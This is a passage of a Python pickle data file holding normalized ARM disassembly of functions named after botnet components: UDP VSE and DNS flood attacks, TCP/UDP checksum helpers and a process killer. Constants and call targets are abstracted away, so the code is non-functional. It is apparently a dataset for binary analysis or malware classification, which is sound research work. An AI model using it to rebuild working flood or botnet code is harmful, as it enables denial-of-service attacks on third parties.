S'"STMFD~SP!,{R4-R11,LR}\nSUB~SP,SP,0\nMOV~R11,R1\nMOV~R5,R3\nAND~R0,R0,0\nSTR~R0,[SP,0]\nAND~R4,R2,0\nMOV~R1,0\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R0,R0,0\nSTR~R0,[SP,0]\nMOV~R6,0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R6\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R8,R0,0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R7,R0,0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R6\nBL~FOO\nMOV~R9,R0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R6\nBL~FOO\nMOV~R10,R0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nMOV~R6,R0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R2\nBL~FOO\nAND~R0,R0,0\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nLDR~R3,<STR>\nLDR~R3,[R3]\nBL~FOO\nMOV~R4,R0\nMOV~R0,0\nMOV~R1,0\nMOV~R2,0\nBL~FOO\nSTR~R0,[SP,0]\nCMN~R0,0\nBEQ~FOO\nADD~R3,SP,0\nMOV~R2,0\nSTR~R2,[R3,-0]\nADD~R2,R2,0\nSTR~R2,[SP]\nMOV~R1,0\nSUB~R2,R2,0\nBL~FOO\nCMN~R0,0\nBNE~FOO\nLDR~R0,[SP,0]\nBL~FOO\nB~FOO\nLDR~R1,[SP,0]\nSTR~R1,[SP,0]\nLDR~R2,[SP,0]\nMOV~R3,R2,LSL0\nMOV~R3,R3,LSR0\nSTR~R3,[SP,0]\nMOV~R3,R9,LSL0\nMOV~R3,R3,LSR0\nSTR~R3,[SP,0]\nMOV~R3,R10,LSL0\nMOV~R3,R3,LSR0\nSTR~R3,[SP,0]\nSTR~R4,[SP,0]\nMOV~R2,R6,LSL0\nMOV~R2,R2,LSR0\nMOV~R3,0\nCMP~R2,R3\nMOVCC~R10,R2\nMOVCS~R10,R3\nMOV~R3,0\nSTR~R3,[SP,0]\nLDR~R9,[SP,0]\nCMP~R9,0\nBLE~FOO\nMOV~R4,R3\nADD~R3,R10,0\nMOV~R3,R3,LSL0\nMOV~R2,R3,LSR0\nMOV~R3,R3,LSR0\nAND~R2,R2,0\nORR~R5,R3,R2,LSL0\nMOV~R6,R5,ASR0\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nLDR~R3,[SP,0]\nSTR~R0,[R3,R4,LSL0]\nLDR~R3,[SP,0]\nLDR~R12,[SP,0]\nLDR~R1,[R12,R3,LSL0]\nADD~R0,R1,0\nLDRB~R3,[R1]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R1]\nLDRB~R3,[R1]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R1]\nLDR~R2,[SP,0]\nSTRB~R2,[R1,0]\nSTRB~R5,[R1,0]\nSTRB~R6,[R1,0]\nLDR~R12,[SP,0]\nMOV~R3,R12,LSR0\nAND~R2,R12,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R1,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R1,0]\nSTRB~R8,[R1,0]\nCMP~R7,0\nMOVNE~R3,0\nSTRNEB~R3,[R1,0]\nSUBNE~R3,R3,0\nSTRNEB~R3,[R1,0]\nMOV~R3,0\nSTRB~R3,[R1,0]\nLDR~R2,[SP,0]\nSTR~R2,[R1,0]\nLDR~R2,[SP,0]\nMOV~R3,R2,LSL0\nSUB~R3,R3,R2,LSL0\nADD~R3,R3,R11\nLDR~R3,[R3,0]\nSTR~R3,[R1,0]\nLDR~R12,[SP,0]\nMOV~R3,R12,LSR0\nAND~R2,R12,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R0,0]\nLDR~R1,[SP,0]\nMOV~R3,R1,LSR0\nAND~R2,R1,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R0,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R0,0]\nADD~R3,R10,0\nMOV~R3,R3,LSL0\nMOV~R2,R3,LSR0\nMOV~R3,R3,LSR0\nAND~R2,R2,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R0,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R0,0]\nLDR~R3,[SP,0]\nADD~R4,R3,0\nSTR~R4,[SP,0]\nCMP~R9,R4\nBGT~FOO\nMOV~R3,0\nCMP~R9,R3\nMOV~R2,R3\nBLE~FOO\nSTR~R3,[SP,0]\nMOV~R3,0\nSUB~R8,R3,0\nLDR~R3,[SP,0]\nLDR~R7,[R3,R2,LSL0]\nMOV~R6,R7\nADD~R5,R7,0\nMOV~R3,R2,LSL0\nSUB~R3,R3,R2,LSL0\nADD~R2,R3,R11\nLDRB~R3,[R2,0]\nCMP~R3,0\nBHI~FOO\nLDR~R4,[R2,0]\nBL~FOO\nAND~R2,R4,0\nMOV~R2,R2,LSR0\nORR~R2,R2,R4,LSR0\nAND~R3,R4,0\nMOV~R4,R4,LSL0\nORR~R4,R4,R3,LSL0\nORR~R2,R2,R4\nLDR~R1,[SP,0]\nMOV~R3,R1,LSL0\nSUB~R3,R3,R1,LSL0\nADD~R3,R3,R11\nLDRB~R3,[R3,0]\nADD~R2,R2,R0,LSRR3\nAND~R3,R2,0\nMOV~R3,R3,LSR0\nORR~R3,R3,R2,LSR0\nAND~R1,R2,0\nMOV~R2,R2,LSL0\nORR~R2,R2,R1,LSL0\nORR~R3,R3,R2\nSTR~R3,[R7,0]\nLDR~R12,[SP,0]\nCMN~R12,0\nBNE~FOO\nBL~FOO\nSTR~R0,[R6,0]\nLDR~R1,[SP,0]\nCMP~R1,R8\nBNE~FOO\nBL~FOO\nSTRB~R0,[R6,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R6,0]\nLDR~R2,[SP,0]\nCMP~R2,R8\nBNE~FOO\nBL~FOO\nSTRB~R0,[R5]\nMOV~R0,R0,ASR0\nSTRB~R0,[R5,0]\nLDR~R3,[SP,0]\nCMP~R3,R8\nBNE~FOO\nBL~FOO\nSTRB~R0,[R5,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R5,0]\nLDR~R12,[SP,0]\nCMP~R12,0\nADDNE~R0,R5,0\nMOVNE~R1,R10\nBLNE~FOO\nMOV~R4,0\nSTRB~R4,[R6,0]\nSTRB~R4,[R6,0]\nMOV~R0,R6\nMOV~R1,0\nBL~FOO\nSTRB~R0,[R6,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R6,0]\nSTRB~R4,[R5,0]\nSTRB~R4,[R5,0]\nLDRB~R3,[R5,0]\nLDRB~R2,[R5,0]\nMOV~R0,R6\nMOV~R1,R5\nORR~R2,R3,R2,LSL0\nADD~R3,R10,0\nBL~FOO\nSTRB~R0,[R5,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R5,0]\nLDR~R3,[SP,0]\nMOV~R2,R3,LSL0\nSUB~R2,R2,R3,LSL0\nADD~R2,R2,R11\nLDR~R3,[R5]\nMOV~R3,R3,LSR0\nSTRB~R3,[R2,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R2,0]\nSTR~R2,[SP]\nMOV~R3,0\nSTR~R3,[SP,0]\nLDR~R0,[SP,0]\nMOV~R1,R7\nADD~R2,R10,0\nMOV~R3,0\nBL~FOO\nLDR~R3,[SP,0]\nADD~R2,R3,0\nSTR~R2,[SP,0]\nCMP~R2,R9\nBLT~FOO\nB~FOO\nADD~SP,SP,0\nLDMFD~SP!,{R4-R11,PC}"'
p65
L1248L
tp66
a(S'attack_udp_vse'
p67
S'"STMFD~SP!,{R4-R11,LR}\nSUB~SP,SP,0\nMOV~R9,R1\nMOV~R6,R3\nAND~R0,R0,0\nSTR~R0,[SP,0]\nAND~R4,R2,0\nMOV~R1,0\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R6\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R0,R0,0\nSTR~R0,[SP,0]\nMOV~R5,0\nMOV~R0,R4\nMOV~R1,R6\nMOV~R2,0\nMOV~R3,R5\nBL~FOO\nMOV~R11,R0\nMOV~R0,R4\nMOV~R1,R6\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R8,R0,0\nMOV~R0,R4\nMOV~R1,R6\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R7,R0,0\nMOV~R0,R4\nMOV~R1,R6\nMOV~R2,0\nMOV~R3,R5\nBL~FOO\nMOV~R10,R0\nMOV~R0,R4\nMOV~R1,R6\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nMOV~R4,R0\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nADD~R1,SP,0\nBL~FOO\nMOV~R5,R0\nMOV~R0,0\nMOV~R1,0\nMOV~R2,0\nBL~FOO\nSTR~R0,[SP,0]\nCMN~R0,0\nBEQ~FOO\nADD~R3,SP,0\nMOV~R2,0\nSTR~R2,[R3,-0]\nADD~R2,R2,0\nSTR~R2,[SP]\nMOV~R1,0\nSUB~R2,R2,0\nBL~FOO\nCMN~R0,0\nBNE~FOO\nLDR~R0,[SP,0]\nBL~FOO\nB~FOO\nLDR~R2,[SP,0]\nSTR~R2,[SP,0]\nMOV~R3,R11,LSL0\nMOV~R3,R3,LSR0\nSTR~R3,[SP,0]\nMOV~R3,R10,LSL0\nMOV~R3,R3,LSR0\nSTR~R3,[SP,0]\nMOV~R3,R4,LSL0\nMOV~R11,R3,LSR0\nMOV~R3,0\nSTR~R3,[SP,0]\nLDR~R10,[SP,0]\nCMP~R10,0\nBLE~FOO\nMOV~R4,R3\nLDR~R3,[SP,0]\nMOV~R6,R3,LSR0\nLDR~R2,[SP,0]\nMOV~R2,R2,LSR0\nSTR~R2,[SP,0]\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nLDR~R3,[SP,0]\nSTR~R0,[R3,R4,LSL0]\nLDR~R3,[SP,0]\nLDR~R2,[SP,0]\nLDR~R1,[R2,R3,LSL0]\nADD~R12,R1,0\nADD~R0,R1,0\nLDRB~R3,[R1]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R1]\nLDRB~R3,[R1]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R1]\nLDR~R3,[SP,0]\nSTRB~R3,[R1,0]\nLDR~R2,[SP,0]\nADD~R2,R2,0\nMOV~R2,R2,LSL0\nMOV~R3,R2,LSR0\nAND~R3,R3,0\nORR~R3,R3,R2,LSR0\nSTRB~R3,[R1,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R1,0]\nLDR~R2,[SP,0]\nAND~R3,R2,0\nORR~R3,R6,R3,LSL0\nSTRB~R3,[R1,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R1,0]\nSTRB~R8,[R1,0]\nCMP~R7,0\nMOVNE~R3,0\nSTRNEB~R3,[R1,0]\nSUBNE~R3,R3,0\nSTRNEB~R3,[R1,0]\nMOV~R3,0\nSTRB~R3,[R1,0]\nLDR~R3,<STR>\nLDR~R3,[R3]\nSTR~R3,[R1,0]\nLDR~R2,[SP,0]\nMOV~R3,R2,LSL0\nSUB~R3,R3,R2,LSL0\nADD~R3,R3,R9\nLDR~R3,[R3,0]\nSTR~R3,[R1,0]\nLDR~R2,[SP,0]\nAND~R3,R2,0\nLDR~R2,[SP,0]\nORR~R3,R2,R3,LSL0\nSTRB~R3,[R12]\nMOV~R3,R3,ASR0\nSTRB~R3,[R12,0]\nMOV~R3,R11,LSR0\nAND~R2,R11,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R12,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R12,0]\nLDR~R2,[SP,0]\nADD~R2,R2,0\nMOV~R2,R2,LSL0\nMOV~R3,R2,LSR0\nAND~R3,R3,0\nORR~R3,R3,R2,LSR0\nSTRB~R3,[R12,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R12,0]\nMOV~R3,0\nSTR~R3,[R0]\nMOV~R1,R5\nLDR~R2,[SP,0]\nBL~FOO\nLDR~R3,[SP,0]\nADD~R4,R3,0\nSTR~R4,[SP,0]\nCMP~R4,R10\nBLT~FOO\nMOV~R3,0\nCMP~R10,R3\nMOV~R2,R3\nBLE~FOO\nSTR~R3,[SP,0]\nMOV~R3,0\nSUB~R8,R3,0\nLDR~R3,[SP,0]\nLDR~R7,[R3,R2,LSL0]\nMOV~R6,R7\nADD~R5,R7,0\nMOV~R3,R2,LSL0\nSUB~R3,R3,R2,LSL0\nADD~R2,R3,R9\nLDRB~R3,[R2,0]\nCMP~R3,0\nBHI~FOO\nLDR~R4,[R2,0]\nBL~FOO\nAND~R2,R4,0\nMOV~R2,R2,LSR0\nORR~R2,R2,R4,LSR0\nAND~R3,R4,0\nMOV~R4,R4,LSL0\nORR~R4,R4,R3,LSL0\nORR~R2,R2,R4\nLDR~R1,[SP,0]\nMOV~R3,R1,LSL0\nSUB~R3,R3,R1,LSL0\nADD~R3,R3,R9\nLDRB~R3,[R3,0]\nADD~R2,R2,R0,LSRR3\nAND~R3,R2,0\nMOV~R3,R3,LSR0\nORR~R3,R3,R2,LSR0\nAND~R1,R2,0\nMOV~R2,R2,LSL0\nORR~R2,R2,R1,LSL0\nORR~R3,R3,R2\nSTR~R3,[R7,0]\nLDR~R2,[SP,0]\nCMP~R2,R8\nBNE~FOO\nBL~FOO\nSTRB~R0,[R6,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R6,0]\nLDR~R3,[SP,0]\nCMP~R3,R8\nBNE~FOO\nBL~FOO\nSTRB~R0,[R5]\nMOV~R0,R0,ASR0\nSTRB~R0,[R5,0]\nCMP~R11,R8\nBNE~FOO\nBL~FOO\nSTRB~R0,[R5,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R5,0]\nMOV~R4,0\nSTRB~R4,[R6,0]\nSTRB~R4,[R6,0]\nMOV~R0,R6\nMOV~R1,0\nBL~FOO\nSTRB~R0,[R6,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R6,0]\nSTRB~R4,[R5,0]\nSTRB~R4,[R5,0]\nLDRB~R3,[R5,0]\nLDRB~R2,[R5,0]\nMOV~R0,R6\nMOV~R1,R5\nORR~R2,R3,R2,LSL0\nLDR~R3,[SP,0]\nADD~R3,R3,0\nBL~FOO\nSTRB~R0,[R5,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R5,0]\nLDR~R3,[SP,0]\nMOV~R2,R3,LSL0\nSUB~R2,R2,R3,LSL0\nADD~R2,R2,R9\nLDR~R3,[R5]\nMOV~R3,R3,LSR0\nSTRB~R3,[R2,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R2,0]\nSTR~R2,[SP]\nMOV~R3,0\nSTR~R3,[SP,0]\nLDR~R0,[SP,0]\nMOV~R1,R7\nLDR~R2,[SP,0]\nADD~R2,R2,0\nMOV~R3,0\nBL~FOO\nLDR~R3,[SP,0]\nADD~R2,R3,0\nSTR~R2,[SP,0]\nCMP~R2,R10\nBLT~FOO\nB~FOO\nADD~SP,SP,0\nLDMFD~SP!,{R4-R11,PC}"'
p68
L1156L
tp69
a(S'attack_udp_dns'
p70
S'"STMFD~SP!,{R4-R11,LR}\nSUB~SP,SP,0\nSUB~SP,SP,0\nSTR~R1,[SP,0]\nMOV~R5,R3\nAND~R0,R0,0\nSTR~R0,[SP,0]\nAND~R4,R2,0\nMOV~R1,0\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R0,R0,0\nSTR~R0,[SP,0]\nMOV~R6,0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R6\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R9,R0,0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R10,R0,0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R6\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R6\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nMOV~R11,R0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nMOV~R8,R0\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R1,0\nBL~FOO\nMOV~R4,R0\nMOV~R0,0\nBL~FOO\nCMP~R4,0\nBLT~FOO\nADD~R7,SP,0\nSUB~R7,R7,0\nMOV~R0,R4\nMOV~R1,R7\nMOV~R2,0\nBL~FOO\nMOV~R6,R0\nMOV~R0,R4\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R2,R0\nMOV~R0,R7\nMOV~R1,R6\nBL~FOO\nMOV~R5,R0\nMOV~R0,0\nBL~FOO\nCMN~R5,0\nBEQ~FOO\nCMP~R6,R5\nBLE~FOO\nADD~R0,R7,R5\nMOV~R4,R5\nMOV~R12,0\nADD~R7,SP,0\nADD~R7,R7,0\nADD~R1,SP,0\nSUB~R1,R1,0\nLDRB~R2,[R0]\nCMP~R12,0\nBNE~FOO\nCMP~R2,0\nCMPNE~R2,0\nBEQ~FOO\nADD~R12,R12,0\nSUB~R3,R2,0\nCMP~R2,0\nCMPNE~R3,0\nBHI~FOO\nSUB~R3,R6,0\nCMP~R4,R3\nBNE~FOO\nRSB~R4,R5,R4\nMOV~R0,R7\nADD~R1,R1,R5\nMOV~R2,R4\nBL~FOO\nADD~R1,SP,0\nADD~R1,R1,0\nADD~R2,R1,R4\nMOV~R3,0\nSTRB~R3,[R2,-0]\nMOV~R0,R7\nBL~FOO\nSTR~R0,[SP,0]\nB~FOO\nADD~R4,R4,0\nADD~R0,R0,0\nCMP~R6,R4\nBNE~FOO\nBL~FOO\nAND~R0,R0,0\nCMP~R0,0\nLDRLS~PC,[PC,R0,LSL0]\nB~FOO\nMOV~R3,0\nSTR~R3,[SP,0]\nB~FOO\nMOV~R3,0\nSTR~R3,[SP,0]\nB~FOO\nMOV~R3,0\nORR~R3,R3,R3,LSL0\nSTR~R3,[SP,0]\nB~FOO\nLDR~R2,<STR>\nSTR~R2,[SP,0]\nCMP~R8,0\nBEQ~FOO\nMOV~R0,R8\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,0\nMOV~R1,0\nMOV~R2,0\nBL~FOO\nSTR~R0,[SP,0]\nCMN~R0,0\nBEQ~FOO\nADD~R3,SP,0\nADD~R3,R3,0\nMOV~R2,0\nSTR~R2,[R3,-0]\nADD~R2,R2,0\nSTR~R2,[SP]\nMOV~R1,0\nSUB~R2,R2,0\nBL~FOO\nCMN~R0,0\nBNE~FOO\nLDR~R0,[SP,0]\nBL~FOO\nB~FOO\nLDR~R3,[SP,0]\nSTR~R3,[SP,0]\nLDR~R4,[SP,0]\nMOV~R3,R4,LSL0\nMOV~R3,R3,LSR0\nSTR~R3,[SP,0]\nLDR~R1,[SP,0]\nMOV~R3,R1,LSL0\nMOV~R3,R3,LSR0\nSTR~R3,[SP,0]\nLDR~R2,[SP,0]\nMOV~R3,R2,LSL0\nMOV~R3,R3,LSR0\nSTR~R3,[SP,0]\nLDR~R4,[SP,0]\nMOV~R3,R4,LSL0\nMOV~R3,R3,LSR0\nSTR~R3,[SP,0]\nAND~R11,R11,0\nMOV~R3,0\nSTR~R3,[SP,0]\nLDR~R1,[SP,0]\nCMP~R1,0\nSTR~R1,[SP,0]\nBLE~FOO\nMOV~R4,R3\nLDR~R2,[SP,0]\nADD~R3,R11,R2\nMOV~R3,R3,LSL0\nADD~R6,R3,0\nMOV~R7,R6,LSR0\nADD~R3,R3,0\nSTR~R3,[SP,0]\nMOV~R3,R3,LSR0\nSTR~R3,[SP,0]\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nLDR~R1,[SP,0]\nSTR~R0,[R1,R4,LSL0]\nLDR~R3,[SP,0]\nLDR~R2,[SP,0]\nLDR~R1,[R2,R3,LSL0]\nADD~LR,R1,0\nADD~R12,R1,0\nADD~R0,R1,0\nLDRB~R3,[R1]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R1]\nLDRB~R3,[R1]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R1]\nLDR~R3,[SP,0]\nSTRB~R3,[R1,0]\nMOV~R3,R6,LSR0\nAND~R3,R3,0\nORR~R3,R7,R3,LSL0\nSTRB~R3,[R1,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R1,0]\nLDR~R4,[SP,0]\nMOV~R3,R4,LSR0\nAND~R2,R4,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R1,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R1,0]\nSTRB~R9,[R1,0]\nCMP~R10,0\nMOVNE~R3,0\nSTRNEB~R3,[R1,0]\nSUBNE~R3,R3,0\nSTRNEB~R3,[R1,0]\nMOV~R3,0\nSTRB~R3,[R1,0]\nLDR~R3,<STR>\nLDR~R3,[R3]\nSTR~R3,[R1,0]\nLDR~R2,[SP,0]\nSTR~R2,[R1,0]\nLDR~R4,[SP,0]\nMOV~R3,R4,LSR0\nAND~R2,R4,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[LR]\nMOV~R3,R3,ASR0\nSTRB~R3,[LR,0]\nLDR~R1,[SP,0]\nMOV~R3,R1,LSR0\nAND~R2,R1,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[LR,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[LR,0]\nLDR~R2,[SP,0]\nMOV~R3,R2,LSR0\nAND~R3,R3,0\nLDR~R4,[SP,0]\nORR~R3,R4,R3,LSL0\nSTRB~R3,[LR,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[LR,0]\nLDR~R1,[SP,0]\nMOV~R3,R1,LSR0\nAND~R2,R1,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R12]\nMOV~R3,R3,ASR0\nSTRB~R3,[R12,0]\nMOV~R3,0\nMOV~R5,0\nSTRB~R3,[R12,0]\nSTRB~R5,[R12,0]\nSTRB~R5,[R12,0]\nSTRB~R3,[R12,0]\nSTRB~R11,[R0]\nADD~R4,R0,R11\nADD~R0,R4,R3\nMOV~R1,R8\nLDR~R3,[SP,0]\nADD~R2,R3,0\nBL~FOO\nLDR~R1,[SP,0]\nCMP~R1,R5\nMOVLE~R2,R4\nMOVLE~R0,R5\nBLE~FOO\nMOV~R2,R4\nMOV~R0,0\nMOV~R1,R0\nLDRB~R3,[R1,R8]\nCMP~R3,0\nSTREQB~R0,[R2]\nADDEQ~R3,R4,R1\nADDEQ~R2,R3,0\nMOVEQ~R0,0\nADDNE~R3,R0,0\nANDNE~R0,R3,0\nADD~R1,R1,0\nLDR~R3,[SP,0]\nCMP~R3,R1\nBNE~FOO\nSTRB~R0,[R2]\nLDR~R1,[SP,0]\nADD~R2,R4,R1\nADD~R3,R2,0\nMOV~R1,0\nMOV~R0,0\nSTRB~R1,[R2,0]\nSTRB~R0,[R3,0]\nSTRB~R1,[R3,0]\nSTRB~R0,[R3,0]\nLDR~R3,[SP,0]\nADD~R4,R3,R0\nSTR~R4,[SP,0]\nLDR~R2,[SP,0]\nCMP~R2,R4\nBGT~FOO\nMOV~R3,0\nLDR~R4,[SP,0]\nCMP~R4,R3\nBLE~FOO\nSTR~R3,[SP,0]\nMOV~R1,R3\nMOV~R3,0\nSUB~R10,R3,0\nMOV~R8,0\nLDR~R2,[SP,0]\nADD~R9,R11,R2\nLDR~R3,[SP,0]\nLDR~R7,[R3,R1,LSL0]\nMOV~R5,R7\nADD~R4,R7,0\nADD~R6,R7,0\nLDR~R1,[SP,0]\nCMP~R1,R10\nBNE~FOO\nBL~FOO\nSTRB~R0,[R7,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R7,0]\nLDR~R2,[SP,0]\nCMP~R2,R10\nBNE~FOO\nBL~FOO\nSTRB~R0,[R4]\nMOV~R0,R0,ASR0\nSTRB~R0,[R4,0]\nLDR~R3,[SP,0]\nCMP~R3,R10\nBNE~FOO\nBL~FOO\nSTRB~R0,[R4,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R4,0]\nLDR~R1,[SP,0]\nCMP~R1,R10\nBNE~FOO\nBL~FOO\nSTRB~R0,[R6]\nMOV~R0,R0,ASR0\nSTRB~R0,[R6,0]\nADD~R0,R6,0\nMOV~R1,R11\nBL~FOO\nSTRB~R8,[R5,0]\nSTRB~R8,[R5,0]\nMOV~R0,R5\nMOV~R1,0\nBL~FOO\nSTRB~R0,[R5,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R5,0]\nSTRB~R8,[R4,0]\nSTRB~R8,[R4,0]\nLDRB~R3,[R4,0]\nLDRB~R2,[R4,0]\nMOV~R0,R5\nMOV~R1,R4\nORR~R2,R3,R2,LSL0\nADD~R3,R9,0\nBL~FOO\nSTRB~R0,[R4,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R4,0]\nLDR~R3,[SP,0]\nMOV~R2,R3,LSL0\nSUB~R2,R2,R3,LSL0\nLDR~R3,[SP,0]\nADD~R2,R2,R3\nLDR~R1,[SP,0]\nSTR~R1,[R2,0]\nLDR~R3,[R4]\nMOV~R3,R3,LSR0\nSTRB~R3,[R2,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R2,0]\nSTR~R2,[SP]\nMOV~R3,0\nSTR~R3,[SP,0]\nLDR~R0,[SP,0]\nMOV~R1,R7\nADD~R2,R9,0\nMOV~R3,0\nBL~FOO\nLDR~R3,[SP,0]\nADD~R1,R3,0\nSTR~R1,[SP,0]\nLDR~R2,[SP,0]\nCMP~R2,R1\nBGT~FOO\nB~FOO\nADD~SP,SP,0\nADD~SP,SP,0\nLDMFD~SP!,{R4-R11,PC}"'
p71
L1808L
tp72
a(S'checksum_generic'
p73
S'"CMP~R1,0\nMOVLS~R12,0\nBLS~FOO\nMOV~R12,0\nLDRB~R3,[R0]\nLDRB~R2,[R0,0]\nORR~R3,R3,R2,LSL0\nADD~R12,R12,R3\nADD~R0,R0,0\nSUB~R1,R1,0\nCMP~R1,0\nBHI~FOO\nCMP~R1,0\nLDREQB~R3,[R0]\nADDEQ~R12,R12,R3\nMOV~R0,0\nAND~R0,R12,R0\nADD~R0,R0,R12,LSR0\nADD~R0,R0,R0,LSR0\nMVN~R0,R0\nMOV~R0,R0,LSL0\nMOV~R0,R0,LSR0\nRET"'
p74
L96L
tp75
a(S'checksum_tcpudp'
p76
S'"STMFD~SP!,{R4-R6,LR}\nMOV~R12,R3\nMOV~R2,R2,LSL0\nMOV~R6,R2,LSR0\nADD~R4,R0,0\nLDMIA~R4,{R4,R5}\nCMP~R3,0\nMOVLE~LR,0\nBLE~FOO\nMOV~LR,0\nLDRB~R3,[R1]\nLDRB~R2,[R1,0]\nORR~R3,R3,R2,LSL0\nADD~LR,LR,R3\nADD~R1,R1,0\nSUB~R12,R12,0\nCMP~R12,0\nBGT~FOO\nCMP~R12,0\nLDREQB~R3,[R1]\nADDEQ~LR,LR,R3\nMOV~R3,0\nAND~R2,R3,R4,LSR0\nAND~R1,R4,R3\nADD~R2,R2,R1\nAND~R1,R3,R5,LSR0\nADD~R1,LR,R1\nAND~R3,R5,R3\nADD~R2,R2,R3\nLDRB~R3,[R0,0]\nMOV~R3,R3,LSL0\nADD~R1,R1,R3\nADD~R2,R2,R6\nADD~R0,R1,R2\nMOVS~R2,R0,LSR0\nBEQ~FOO\nMOV~R3,0\nSUB~R1,R3,0\nAND~R3,R0,R1\nADD~R0,R3,R2\nMOVS~R2,R0,LSR0\nBNE~FOO\nMVN~R0,R0\nMOV~R0,R0,LSL0\nMOV~R0,R0,LSR0\nLDMFD~SP!,{R4-R6,PC}"'
p77
L188L
tp78
a(S'mem_exists'
p79
S'"STMFD~SP!,{R4,LR}\nMOV~LR,R2\nMOV~R4,R3\nCMP~R3,R1\nMOVLE~R12,0\nBLE~FOO\nB~FOO\nLDRB~R2,[R0]\nLDRB~R3,[R12,LR]\nCMP~R2,R3\nMOVNE~R12,0\nBNE~FOO\nADD~R12,R12,0\nCMP~R4,R12\nBNE~FOO\nMOV~R0,0\nLDMFD~SP!,{R4,PC}\nADD~R0,R0,0\nSUB~R1,R1,0\nCMN~R1,0\nBNE~FOO\nMOV~R0,0\nLDMFD~SP!,{R4,PC}"'
p80
L92L
tp81
a(S'killer_kill'
p82
S'"STR~LR,[SP,-0]\nLDR~R3,<STR>\nLDR~R0,[R3]\nMOV~R1,0\nBL~FOO\nLDR~PC,[SP]"'
p83
L24L
tp84
a(S'killer_kill_by_port'
p85
